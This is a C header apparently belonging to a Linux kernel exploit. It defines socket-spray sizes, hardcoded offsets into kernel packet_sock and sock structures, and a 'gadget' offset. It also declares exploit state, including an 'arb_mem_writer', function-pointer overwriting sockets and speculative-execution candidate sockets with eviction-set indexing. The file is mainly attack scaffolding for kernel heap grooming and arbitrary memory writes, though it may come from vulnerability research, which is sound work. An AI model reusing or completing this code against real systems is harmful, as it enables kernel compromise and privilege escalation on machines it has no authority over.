#ifndef _MEMPREP_H_
#define _MEMPREP_H_

#include <stddef.h>

#define BLOCK_SIZE 0x8000
#define SOCKET_SIZE 0x800
#define NUM_SOCKETS_IN_BLOCK (BLOCK_SIZE / SOCKET_SIZE)
#define NUM_SOCKETS_IN_SOCK_SPRAY (NUM_SOCKETS_IN_BLOCK * 2)

#define GSOCKETS NUM_SOCKETS_IN_SOCK_SPRAY // gap creating sockets for alignment purposes
#define FSOCKETS NUM_SOCKETS_IN_SOCK_SPRAY // flag/fptr overwriting sockets
#define SSOCKETS NUM_SOCKETS_IN_SOCK_SPRAY // specex candidate sockets

// * * * * * * * * * * * * * * Kernel struct offsets * * * * * * * * * * * * *

// packet_sock->rx_ring.prb_bdqc.blk_sizeof_priv
#define SIZEOF_PRIV_OFFSET 812

#define SKC_FLAGS_OFFSET 96
#define SK_WRITE_SPACE_OFFSET 664

#define FIRST_DEREF_IN_GADGET_SK_OFFSET 0x158

// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

typedef struct {
  int sockfd;
  unsigned char* map;
  struct iovec* iov;
  size_t block_size;
  int num_blocks;
} rxring_socket;

extern int curr_specex_socket;
extern int specex_socket_first;
extern int specex_socket_second;
extern int specex_sockets_evicset_idx;

extern rxring_socket* offset_writer;
extern rxring_socket* arb_mem_writer;

unsigned int calc_sizeof_priv(int offset);
void prepare_memory_layout();
void find_necessary_items();
void find_specex_sockets_evicset_idx();
void free_unneeded_objects();

#endif /* _MEMPREP_H_ */
